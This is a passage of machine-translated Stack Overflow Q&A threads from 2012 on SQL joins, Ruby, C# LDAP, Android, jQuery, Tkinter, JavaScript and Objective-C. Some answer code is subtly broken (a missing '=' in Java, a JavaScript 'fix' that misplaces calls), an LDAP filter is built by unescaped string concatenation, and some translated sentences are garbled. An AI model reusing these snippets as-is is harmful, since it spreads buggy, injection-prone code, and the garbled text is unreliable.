AuctionOfferPrice   decimal(15,2)           
AuctionMinimumPrice decimal(15,2)           
AuctionStartDate    datetime            
AuctionEndDate  datetime            
AuctionTimeInterval time            
AuctionNextInterval datetime            
AuctionPercentageChange decimal(5,2)            
Cate_CategoryID int(15)         
Prod_ProductID  int(15)         
Stor_StoreID    int(15)         
StUs_StoreUserID    int(15)         
date_added  datetime 
```

P_产品：

```
ProductID   int(15)         
ProductName varchar(256)        
ProductDescription  text        
ProductPictureLink  longtext    
ProductPrice    decimal(25,2)           
ProductStatus   int(3)          
ProductGroupID  int(15)         
Cate_CategoryID int(15)         
StUs_UserID int(15)         
added_date  datetime 
```

P_ProductsAuctions（存储拍卖和产品之间的 1:Many 关系）：

```
Auct_AuctionID  int(15)         
Prod_ProductID  int(15) 
```

P_Attributes（产品不同变体的表）：

```
AttributeID int(15)         
Auct_AuctionID  int(15)         
Cate_CategoryID int(15)         
AttributeName   varchar(256)        
InternationalName   varchar(256) 
```

编辑： - 问题似乎与 P_Attributes 和 P_AttributeValues 中的参数有关，因为当我向查询中添加 1 个参数时，价格要高 150 美元 - 所以 300 美元有 1 个参数，450 美元有 2 个参数，600 美元有 3 个参数和很快...

编辑2：

在这里找到一个 SQLfiddle：[http ://sqlfiddle.com/#!2/d223f/1](http://sqlfiddle.com/#!2/d223f/1)

编辑 3：

我的输出应该是：

A_NAME -> 测试

C_NAME -> 测试

A_ENDDATE -> 2012 年 9 月 9 日 22:00:00-0400

A_PRICE -> 250

A_NORMALPRICE -> 150

S_NAME ->（空）

提前致谢，

登劳

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T15:34:06.193

你是对的，你的属性表有问题。问题是您有多个属性，导致为每个属性返回另一行。您的 GROUP BY 组合这些行并将所有价格添加到 SUM。

如果您只是将 pav.AttributeValue 添加到您的 SELECT 和 GROUP BY 子句中，您可以看到它的实际效果，43 号为 150 美元，44 号为 150 美元。

您将不得不对其进行重构以进行子选择以获取产品 ID。我还没有完全理解你的架构，但你可能想要这样的东西：

```
 SELECT
  a.AuctionID ,
  c.categoryid,
  p.ProductID ,
  a.AuctionID ,
  ppa.Auct_AuctionID,

  s.storeID,

  a.AuctionName AS A_name,
  c.CategoryName AS C_name,
  a.AuctionEndDate AS A_enddate,
  a.AuctionOfferPrice AS A_price,
  sum(p.ProductPrice) as A_normalprice,
  p.ProductPrice AS A_normalprice,
  s.StoreName AS S_name
FROM
  A_Auctions a
RIGHT JOIN
  A_Categories c
  ON c.CategoryID = '1'
INNER JOIN
  P_ProductsAuctions ppa
  ON ppa.Auct_AuctionID = a.AuctionID
LEFT JOIN
  P_Products p
  ON p.ProductID = ppa.Prod_ProductID
LEFT JOIN
  P_Attributes pa
  ON pa.Cate_CategoryID = c.CategoryID
LEFT JOIN
  S_Stores s
  ON a.Stor_StoreID = s.StoreID

INNER JOIN
  (SELECT distinct Cate_CategoryID FROM P_AttributeValues pav INNER JOIN P_Attributes pa ON pa.AttributeID = pav.Attr_AttributeID 
    WHERE
      (pa.InternationalName = 'size'
      AND pav.AttributeValue = '43')
    OR
      (pa.InternationalName = 'size'
      AND pav.AttributeValue = '44')
  ) pav2  ON pav2.Cate_CategoryID = c.CategoryID 

WHERE
a.Cate_CategoryID = c.CategoryID

GROUP BY productid, auctionid, categoryid
ORDER BY
  a.AuctionID DESC
LIMIT 0,20 
```

# macos - 部署沙盒后是否可以重新启动应用程序？

> ID：12328544
> 
> 赞同：3
> 
> 时间：2012-09-08T06:17:57.677
> 
> 标签：macos, cocoa, sandbox, relaunch

全部，

我需要重新启动我的应用程序。谷歌搜索并得到两个建议：
1\. [https://gist.github.com/2204627](https://gist.github.com/2204627)
直接得到了 lsboxd 消息。

2\. [http://13bold.com/tutorials/relaunching-your-application/](http://13bold.com/tutorials/relaunching-your-application/)
得到 LSOpenFromURLSpec() 返回 -10827 ... 消息

它们都与沙盒有关。

我想知道，有没有办法在部署沙箱的情况下重新启动我的应用程序？谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-09T10:28:39.750

`NSWorkspace`沙盒应用程序可以使用's启动其自身的新副本`launchAppWithBundleIdentifier:`；传入 options `NSWorkspaceLaunchAsync`，`NSWorkspaceLaunchNewInstance`以异步创建一个运行您的应用程序的新进程，并在调用返回后终止当前进程（或将调用作为响应 a 的一部分`NSApplicationWillTerminateNotification`）。

# ruby - 双倍的 ”！！” 在红宝石

> ID：12328549
> 
> 赞同：0
> 
> 时间：2012-09-08T06:18:48.940
> 
> 标签：ruby

> **可能重复：**
> [什么！在红宝石中是什么意思？](https://stackoverflow.com/questions/524658/what-does-mean-in-ruby)
> [红宝石，！！运算符（a/k/a 双键）](https://stackoverflow.com/questions/3994033/ruby-operator-a-k-a-the-double-bang)

有时我会看到这样的 Ruby 代码

```
def sent?
  !!@sent_at
end 
```

这似乎不合逻辑。有必要在这里使用 double`!`吗？就我而言，这可能只是

```
def sent?
  @sent_at
end 
```

更新：那么这些之间有什么区别

```
def sent?
  !!@sent_at
end

def sent?
  @sent_at.nil?
end

def sent?
  @sent_at == nil
end 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T06:20:52.687

我不是 Ruby 人，但我想这是为了将 @sent_at 转换为布尔值。

更新：啊哈，我看到了你的更新。注意`false`和`nil`是不同的；`false.nil? == false`, 而`nil.nil? == true`. 仅在 ruby​​ 中`false`，`nil`将被视为“假”；甚至一个空字符串 ,`''`也被评估为`true`（它`False`在 python 中）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T06:22:27.320

`Double Bang`用于在 Ruby 中将任何内容转换为布尔值。

[http://rubyquicktips.com/post/583755021/convert-anything-to-boolean](http://rubyquicktips.com/post/583755021/convert-anything-to-boolean)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-08T06:22:19.187

它强制一个真值为真，一个假值为假。在 Ruby 中，[**唯一**的假值是 nil 和 false](http://raflabs.com/blogs/silence-is-foo/2010/08/12/nil-true-false-ruby/)，其他所有值都是真值。

```
!falsyExpr   # given -> true
!true        # and -> false
!!falsyExpr  # then -> true -> false

!truthyExpr  # given -> false
!false       # and -> true
!!truthyExpr # then -> false -> true 
```

当从这样的方法返回时，使用`!!expr`over的原因是表单*只会*产生 true 或 false。这避免了泄漏细节，避免了意外的强引用，减少了调试时的混淆，防止了 false/nil 混淆的情况等。它也比具有相同语义的 更短。`expr``!!expr`*`expr ? true : false`*

 **当评估为 nil*时，表单`expr == nil`和`expr.nil?` *仅评估为 true`expr`*。`expr`如果评估为任何其他值，*包括 false* ，它们都是false 。这将它们与对于*false 和 nil*值`!expr`都评估为 true 的区别。

 *当然，以上所有都是*预期的行为*。由于 Ruby 的开放性和运算符重载，有可能（并且非常错误地）创建改变这种预期行为的新方法（除非一些实现优化怪癖）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-08T06:22:27.933

使用`!!`确保返回`true`或`false`返回。所以，是的，这是有道理的。

```
@sent_at = 'Foo'
!!@sent_at # => true

@sent_at = nil
!!@sent_at # => false 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-08T06:23:00.030

它将非布尔类型转换为布尔（`true`或`false`）。

这是执行此操作的快捷方式，而不是尝试显式转换（可能需要更多字符）。这 ！运算符否定其参数的真实性。因此，使用了其中的两个。

另请参阅perl（或大多数其他语言）[的双重否定 (!!) 的使用。](https://stackoverflow.com/questions/12278997/use-of-double-negation)**

# c# - 不正确理解 LDAP DirectoryEntry

> ID：12328551
> 
> 赞同：1
> 
> 时间：2012-09-08T06:18:57.847
> 
> 标签：c#, asp-classic, directoryservices

我在我的 ASP 项目中使用 C# 访问 LDAP 时遇到了一些麻烦。这是一个非常简单的示例，仅检查用户是否存在于我的目录服务中。

这是代码。函数 UserExists() 返回 false

我不完全确定我的 LDAP 查询是否会影响我的目录服务。（活动目录）

```
using System.DirectoryServices;

namespace UserManagement
{
    public partial class Default : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (UserExists("abc"))
                lblUserExists.Text = "Found Username";
        }

        public static DirectoryEntry GetDirectoryEntry()
        {
            DirectoryEntry de = new DirectoryEntry();
            de.Path = "LDAP://OU=Users,OU=Network Users,DC=domain,DC=org";
            de.AuthenticationType = AuthenticationTypes.Secure;

            return de;
        }

        public bool UserExists(String UserName)
        {
            DirectoryEntry de = GetDirectoryEntry();
            DirectorySearcher deSearch = new DirectorySearcher();

            deSearch.SearchRoot = de;
            deSearch.Filter = "(&(objectClass=user) (cn=" + UserName + "))";

            SearchResultCollection results = deSearch.FindAll();
            return results.Count > 0;
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:43:12.307

我不是大师，但有一些想法：

1.  LDAP 连接字符串看起来不正确 - 我原以为它看起来更像`LDAP://MyADServer:389/CN=SomeStore,OU=Users,OU=Network Users,DC=domain,DC=org`

2.  您可能需要加载一些属性，例如

    `string[] propertiesToLoad = new string[] { "DistinguishedName", "mail" } ;` ... `deSearch.PropertiesToLoad = propertiesToLoad;`

3.  可能先尝试在没有用户名过滤器的情况下获取数据，以查看连接是否有效，即

    `deSearch.Filter = "(&(objectClass=user))"`

稍后再添加用户过滤器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:46:03.703

如果您在 Active Directory 中搜索实体时遇到问题，请考虑使用[ldp](http://support.microsoft.com/kb/224543)等工具。您可以使用它来检查您的路径是否正确，对象是否存在等等。

# java - 安卓。从文件中读取内容

> ID：12328555
> 
> 赞同：0
> 
> 时间：2012-09-08T06:19:40.547
> 
> 标签：java, android

我正在使用下一种方法从文件中读取内容。这里的问题是我仅限于为指定的字符`inputBuffer`（在本例中为 1024）。

首先，如果内容长度小于 1024 个字符，我会得到很多空白字符，我需要使用修剪来删除它们。

其次，这更重要，我想读取文件的全部内容，即使它超过 1024 个字符并将其插入到`String`对象中。我知道我不应该使用该`.available`方法来确定文件中是否有更多数据，因为它不准确或类似的东西。

关于我应该如何做这件事的任何想法？

```
public String getContent( String sFileName )
{
    //Stop in case the file does not exists
    if ( !this.exists( sFileName ) )
        return null;

    FileInputStream fIn = null;

    InputStreamReader isr = null;

    String data = null;

    try{

        char[] inputBuffer = new char[1024];

        fIn = _context.openFileInput(sFileName);

        isr = new InputStreamReader(fIn);

        isr.read(inputBuffer);

        data = new String(inputBuffer);

        isr.close();

        fIn.close();

    }catch(IOException e){

        e.printStackTrace(System.err);
        return null;

    }

    return data.trim();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:25:35.843

您可以在分配缓冲区之前读取 #/bytes ：

```
// Poor
char[] inputBuffer = new char[1024];
fIn = _context.openFileInput(sFileName);
isr = new InputStreamReader(fIn);

// Better
long nbytes = new File(sFileName).length();
char[] inputBuffer new char[nbytes];
isr = new InputStreamReader (
  _context.openFileInput (sFileName)); 
```

Another solution is to read the input as strings, a line at a time.

# jquery - 我如何在 jquery 中点击 rss feed url

> ID：12328561
> 
> 赞同：0
> 
> 时间：2012-09-08T06:21:17.160
> 
> 标签：jquery

我想使用 jquery 来访问这个 url

```
http://localhost:8161/admin/queueBrowse/sourcename?view=rss&feedType=rss_2.0 
```

我如何通过将参数传递为 view=rss&feedType=rss_2.0 来做到这一点

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:44:43.003

要通过 AJAX 加载该 XML 文件以使用 jQuery 进行处理，可以使用以下代码：

```
$.get("http://localhost:8161/admin/queueBrowse/sourcename", {
        view: 'rss',
        feedType: 'rss_2.0'
    }, function (xml) {
        // process xml here

    }, "xml"); 
```

文档：[http ://api.jquery.com/jQuery.get/](http://api.jquery.com/jQuery.get/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-14T05:38:59.637

你可以用这个..

```
$.ajax({
        type: "GET",
        url: "//localhost:8161/admin/queueBrowse/sourcename",
        data:{
              view: 'rss',
              feedType: 'rss_2.0'
             }
        dataType: "xml",
        success: xmlParser
    });

function xmlParser(xml){
//process XML
} 
```

# jquery - Jquery datepicker 不显示

> ID：12328562
> 
> 赞同：2
> 
> 时间：2012-09-08T06:21:26.113
> 
> 标签：jquery, asp.net-mvc, jquery-ui

这是示例代码。在加载时，我可以看到 dateofbirth 更改为 08-06-1990，但在单击文本框时未显示 datepicker。layout.cshtml 包含以下内容

```
<script src="~/Scripts/jquery-1.7.1.js"></script>
<script src="~/Scripts/jquery-ui-1.8.20.js"></script> 
```

我可以看到它们已加载到 firebug 中。我已经删除了 EditorFor，而是仅用于测试。任何的想法。

```
@model SMS.Model.Student

@{
    ViewBag.Title = "Edit";
}

<script type="text/javascript">
    $(document).ready(function(){
        $('#DateofBirth').val("08-06-1990");
        $('#DateofBirth').datepicker();
    });
</script>

<h2>Edit</h2>

@using (Html.BeginForm())
{
    @Html.ValidationSummary(true)

    <fieldset>
        <legend>Student</legend>

        @Html.HiddenFor(model => model.Id)

        <div class="editor-label">
            @Html.LabelFor(model => model.RegistrationNo)
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => model.RegistrationNo)
            @Html.ValidationMessageFor(model => model.RegistrationNo)
        </div>

        <div class="editor-label">
            @Html.LabelFor(model => model.DateofBirth)
        </div>

        <input  id="DateofBirth" value="07-06-1990" />

        <p>
            <input  type="submit" value="Save" />
        </p>
    </fieldset>
}

<div>
    @Html.ActionLink("Back to List", "Index")
</div>

@section Scripts {
    @Scripts.Render("~/bundles/jqueryval")
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T17:07:10.377

现在可以了。我注意到我的 layout.cshtml 有

```
 @Scripts.Render("~/bundles/jquery")
 @RenderSection("scripts", required: false) 
```

在正文部分，我使用两次加载 jquery 文件来明确引用 jquery 和 jquery ui，从而导致此问题。我从标题中删除了这个

```
<script src="~/Scripts/jquery-1.7.1.js"></script>
<script src="~/Scripts/jquery-ui-1.8.20.js"></script> 
```

并感动

```
@Scripts.Render("~/bundles/jquery") 
```

到标题并将jqueryui添加到标题中。它完美地工作。

```
@Scripts.Render("~/bundles/jqueryui") 
```

# python - 在 Python Tkinter 中绑定 Ctrl (-)

> ID：12328563
> 
> 赞同：2
> 
> 时间：2012-09-08T06:21:33.607
> 
> 标签：python, tkinter

我有一个带有 Text 小部件的应用程序，我希望当用户按下 Control 键和减号键 (-) 时我的字体变小。

编码

```
self.bind_all("<Control-=>", self.increaseFont) 
```

当用户按下控制键和等号键时，似乎可以很好地使字体增加，但是该行

```
self.bind_all("<Control-->", self.decreaseFont) 
```

似乎不起作用。

当我尝试运行它时，它给了我一个运行时错误：

```
Traceback (most recent call last):
  File "./mathEditor.py", line 122, in <module>
    app = MathEditor(fileName = sys.argv[1])
  File "./mathEditor.py", line 40, in __init__
    self.bind_all("<Control-->", self.decreaseFont)
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk/Tkinter.py", line 997, in bind_all
    return self._bind(('bind', 'all'), sequence, func, add, 0)
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk/Tkinter.py", line 940, in _bind
    self.tk.call(what + (sequence, cmd))
_tkinter.TclError: no event type or button # or keysym 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-08T06:25:12.477

试试`self.bind_all("<Control-minus>", self.decreaseFont)`。

# html - HTML5 演示文稿——它们是什么，技术是什么？

> ID：12328569
> 
> 赞同：1
> 
> 时间：2012-09-08T06:22:23.620
> 
> 标签：html, presentation

究竟什么是 HTML5 演示文稿……它们所依赖的技术是什么？

它只是普通的 CSS + AJAX 吗？还是完全是别的东西？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T06:30:57.167

HTML5 演示系统只是一个使用 HTML5 技术编写的演示框架。例如，一些演示系统：[http](http://www.sitepoint.com/5-free-html5-presentation-systems/) ://www.sitepoint.com/5-free-html5-presentation-systems/ 。

因为演示幻灯片是动态的，所以框架必须用 Javascript 和 CSS 编写。

基本上，它与构建在 Javascript 和 CSS 之上的所有其他客户端框架相同。唯一的区别是它的设计目的。其他框架是为动态客户端 Web 应用程序设计的，而 HTML5 演示系统是为……演示而设计的框架。

# javascript - 外部链接的 Javascript 文件不会执行，但该功能有效

> ID：12328573
> 
> 赞同：0
> 
> 时间：2012-09-08T06:22:36.413
> 
> 标签：javascript, html, ajax, forms

这很可能是一个非常简单的问题。

我有一个外部 javascript 文件链接到我的主 html 文件。链接很好，但是调用时函数不会运行。我知道该功能有效，因为我可以将其复制并粘贴到我的主 html 文件中。但是，一旦它在外部文件中，该函数将不会运行。

我究竟做错了什么？

我的主要 html 文件的片段：

```
<html>

<head>
    <link rel="stylesheet" href="style.css">
    <script type="text/javascript" src="VRC_Index_Ajax_Functions.js"></script><--The issue file-->
    <script type="text/javascript" src="validations.js"></script> <--This file works--> 
```

这是我的整个 VRC_Index_Ajax_Functions.js 文件。我处理的函数主要是showHint(str)。我会提到 showHint_l(str) 在这个文件中也不起作用。我还不确定其他功能。

```
 //VRC_Index_Ajax_Function.js - ajax calls

//Publisher Hints - First Name
function showHint(str)
{
 if (str.length==0)
 {
   document.getElementById("txtHint").innerHTML="";
   return;
 }
 if (window.XMLHttpRequest)
 {// code for IE7+, Firefox, Chrome, Opera, Safari
   xmlhttp=new XMLHttpRequest();
 }
 else
 {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
 }
 xmlhttp.onreadystatechange=function()
 {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
 {
   document.getElementById("txtHint").innerHTML=xmlhttp.responseText;
 }
 }
 xmlhttp.open("GET","gethint.php?q="+str,true);
 xmlhttp.send();
}

//Publisher Hints - Last Name
function showHint_l(str)
{
 if (str.length==0)
{
 document.getElementById("txtHint").innerHTML="";
 return;
}
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
 xmlhttp=new XMLHttpRequest();
}
else
{// code for IE6, IE5
 xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
 xmlhttp.onreadystatechange=function()
{
if (xmlhttp.readyState==4 && xmlhttp.status==200)
{
   document.getElementById("txtHint").innerHTML=xmlhttp.responseText;
}
}
xmlhttp.open("GET","gethint2.php?q="+str,true);
xmlhttp.send();
}

 //Ajax function for checking out territories - it will simply call the php file
 function checkOut(params)
{
var urlString = params;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
}
else
{// code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
  {
    document.getElementById("test").innerHTML=xmlhttp.responseText; 
}
//Setup for post submission 
xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlhttp.setRequestHeader("Content-length", params.length);
xmlhttp.open("POST","checkOut.php",true);
xmlhttp.send(urlString);
}

//Function that displays checked out territories
function displayChOut(params)
{
if(window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
}
else
{// code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("displayCO").innerHTML=xmlhttp.responseText;
    }
}

xmlhttp.open("POST","ajax_checked_out.php",true);
xmlhttp.send();
 }

 function checkStatus()
 {
if(window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
    xmlhttp=new XMLHttpRequest();
}
else
{// code for IE6, IE5
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange=function()
{
    if(xmlhttp.readystate == 4 && xmlhttp.status == 200)
    {
    document.getElementsByName("numberOut").innerHTML=xmlhttp.responseText;
    }
}

xmlhttp.open("POST", "checkStatus_php.php", true);
xmlhttp.send();
 } 
```

我真的不知道为什么它突然不能在外部文件中工作。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:29:15.500

您错过了函数的右大括号：

```
function showHint(str) {
    if (str.length === 0) {
        document.getElementById("txtHint").innerHTML = "";
        return;
    }
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else { // code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.getElementById("txtHint").innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("GET", "gethint.php?q=" + str, true);
    xmlhttp.send();
}

//Publisher Hints - Last Name
function showHint_l(str) {
    if (str.length === 0) {
        document.getElementById("txtHint").innerHTML = "";
        return;
    }
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else { // code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.getElementById("txtHint").innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("GET", "gethint2.php?q=" + str, true);
    xmlhttp.send();
}

//Ajax function for checking out territories - it will simply call the php file
function checkOut(params) {
    var urlString = params;
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else { // code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.getElementById("test").innerHTML = xmlhttp.responseText;
        }
        //Setup for post submission 
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlhttp.setRequestHeader("Content-length", params.length);
        xmlhttp.open("POST", "checkOut.php", true);
        xmlhttp.send(urlString);
    }
} // Here

//Function that displays checked out territories
function displayChOut(params) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else { // code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            document.getElementById("displayCO").innerHTML = xmlhttp.responseText;
        }
    }

    xmlhttp.open("POST", "ajax_checked_out.php", true);
    xmlhttp.send();
}

function checkStatus() {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else { // code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readystate == 4 && xmlhttp.status == 200) {
            document.getElementsByName("numberOut").innerHTML = xmlhttp.responseText;
        }
    }

    xmlhttp.open("POST", "checkStatus_php.php", true);
    xmlhttp.send();
} 
```

与您的问题不太相关，但有一点可维护性：

`xmlhttp`由于此代码，它是全局的。

它被分配给没有范围。

要使变量成为函数范围的局部变量，请执行以下操作：

```
function somefunc() {
    var xmlhttp;
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:27:00.993

尝试将所有 js 包含移动到 html 文件的末尾。也许你在 DOM 准备好之前调用了这个函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T06:27:08.727

我还没有查看代码，但是如果 javascript 文件的一部分格式错误，那么整个文件将无法正常工作。如果您缺少花括号 {} 或括号，或任何其他语法错误。

# c# - 如何在网格视图中显示来自（WS 响应）的 xmlnode 值？

> ID：12328577
> 
> 赞同：1
> 
> 时间：2012-09-08T06:23:59.963
> 
> 标签：c#, xml, web-services, rest, amazon-web-services

我在我的网络应用程序中使用 AWS。我得到了 WS 的回应。

xml响应：

```
 <ItemSearchRespone xmlns="http:/....">
  <Items>
   <Item>
  <ASIN>B003MC5N28</ASIN>
  <DetailPageURL>http://www.amazon.com/Giver-Newbery-Medal-Book-ebook/dp/B003MC5N28%3FSubscriptionId%3DAKIAIETT7RP2RAFF4UUQ%26tag%3Dws%26linkCode%3Dxm2%26camp%3D2025%26creative%3D165953%26creativeASIN%3DB003MC5N28</DetailPageURL>
  <SalesRank>469</SalesRank>
   **<ItemAttributes>**
      <Address>
      <Country>us</Country>
      </Address>
    <Author>Lois Lowry</Author>
    <Binding>Kindle Edition</Binding>
    <Country>us</Country>
    <Format>Kindle eBook</Format>
    <Label>Houghton Mifflin Books for Children</Label>
     <ListPrice>
        <Amount>895</Amount>
      <CurrencyCode>USD</CurrencyCode>
      <FormattedPrice>$8.95</FormattedPrice>
     </ListPrice>
      <Manufacturer>Houghton Mifflin Books for Children</Manufacturer>
    <NumberOfItems>1</NumberOfItems>
    <NumberOfPages>204</NumberOfPages>
    <ProductGroup>eBooks</ProductGroup>
    <PublicationDate>1993-04-26</PublicationDate>
    <Publisher>Houghton Mifflin Books for Children</Publisher>
    <ReadingLevel>Young Adult</ReadingLevel>
    <ReleaseDate>1993-04-26</ReleaseDate>
    <Studio>Houghton Mifflin Books for Children</Studio>
    <Title>The Giver (Newbery Medal Book)</Title>
  **</ItemAttributes>**
  </Item>
  <Item>  another item list2</Item>
  <Item>  another item list<3.../Item>
 </Items>
  </ItemSearchResponse> 
```

在这里，我想在网格视图中显示所有书籍的所有标题值和格式化价格。

到目前为止我试过了。,

```
 XmlDocument xdoc = new XmlDocument();
        xdoc.Load(response.GetResponseStream());
        XmlNamespaceManager ns = new XmlNamespaceManager(xdoc.NameTable);
        ns.AddNamespace("ms", "http://webservices.amazon.com/AWSECommerceService/2005-10-05");

        XmlNodeList xnl = xdoc.SelectNodes("//ms:Title", ns);
        XmlNodeList xnl1 = xdoc.SelectNodes("//ms:FormattedPrice", ns);

        DataTable dt=new DataTable();
        dt.Columns.Add("Title",typeof(string));
        dt.Columns.Add("Price", typeof(string));

        foreach (XmlNode Title in xnl)
        {
            DataRow dr = dt.NewRow();
            dr["Title"] = Title.InnerText;

            dt.Rows.Add(dr);
        }
        GridView1.DataSource = dt;
        GridView1.DataBind(); 
```

如何在网格视图中显示价格和标题值？（响应有很多节点，如标题、价格、isbn 等等。如果您需要更多信息，请告诉我。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:44:39.120

`LINQ to XML`解析 XML 文档。

```
XNamespace ns = "http://webservices.amazon.com/AWSECommerceService/2005-10-05";
XDocument doc=XDocument.Load(response.GetResponseStream());

var result= doc.Descendants(ns + "ItemAttributes").Select( p=> new 
 {
 Title=p.Element(ns+ "Title").Value,
 Price = p.Element(ns +"ListPrice").Element(ns+"FormattedPrice").Value
}).ToList();
GridView1.DataSource = result;
GridView1.DataBind(); 
```

或者换个`XPath`表情，

```
 XmlNodeList xnl = xdoc.SelectNodes("/ms:ItemSearchRespone/ms:Items/ms:Item/ms:ItemAttributes", ns);

  foreach (XmlNode ele in xnl)
   {
     Console.WriteLine(ele.SelectSingleNode("ms:Title", ns).InnerText);
     Console.WriteLine(ele.SelectSingleNode("ms:ListPrice/ms:FormattedPrice", ns).InnerText);
   } 
```

# objective-c - 如何在 NSData 中打包结构？

> ID：12328582
> 
> 赞同：7
> 
> 时间：2012-09-08T06:24:32.163
> 
> 标签：objective-c, nsdata

> **可能重复：**
> [通过 GameKit 发送和接收 NSData](https://stackoverflow.com/questions/4837102/send-and-receive-nsdata-via-gamekit)

我有一个结构，它由 int 变量和 2 个浮点指针（数组）组成。我怎样才能打包这个 struct ib NSData 然后解压它？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-08T06:39:18.123

您可以使用 dataWithBytes 方法 pf NSData 打包结构：

```
struct aStruct {
/* Implementation */
};

//Struct variable 
aStruct exampleStruct;

// pack the struct into an NSData Object
NSData *myData = [NSData dataWithBytes:&exampleStruct length:sizeof(exampleStruct)];

// get back the the struct from the object
[myData getBytes:&exampleStruct length:sizeof(exampleStruct)]; 
```

# javascript - 使用 javascript 清除 Asp.NET FreeTextBox (RTF Textbox)

> ID：12328588
> 
> 赞同：0
> 
> 时间：2012-09-08T06:25:42.397
> 
> 标签：javascript, asp.net, freetextbox

我正在为我的 ASP.NET 项目使用一个名为**FreeTextBox** [Demo Link](http://www.freetextbox.com/demos/)的富文本框插件，我需要一些 javascript 代码来清除客户端的文本。

我试过使用

```
///------Javascript Code
function clean_designEditor()
{
    var bodyTextBox = document.getElementById("ctl00_cphContent_ftbMailBody_designEditor");
    frameDoc = bodyTextBox.contentDocument || bodyTextBox.contentWindow.document;
    frameDoc.documentElement.innerHTML = "";
}

///------ASP.NET Code
<asp:Button ID="btnPnlCloseMail" runat="server" Text="X" ToolTip="Close" onclick="btnPnlCloseMail_Click" OnClientClick="clean_designEditor();" /> 
```

它按要求工作，但反过来会导致一些 javascript 错误发生，从而使其他 AJAX 和 Javascript 函数中断。我无法在 Firebug 的控制台窗口或任何其他开发人员工具上提及该错误，因为我无法得到任何错误。而且我的页面有许多 AJAX 请求控件和其他 Javascript 函数，我猜这个操作会导致任何问题，因为当我评论上面提到的 javascript 行时，所有的东西都工作正常。

任何人都可以建议其他方式，以免造成任何故障。

我想这是一个错误，因为我的问题与发布[FreeTextBox javascript 错误正在阻止我的 DropDownList 上的 PostBack非常相似](https://stackoverflow.com/questions/12010998/freetextbox-javascript-error-is-preventing-postback-on-my-dropdownlist?rq=1)

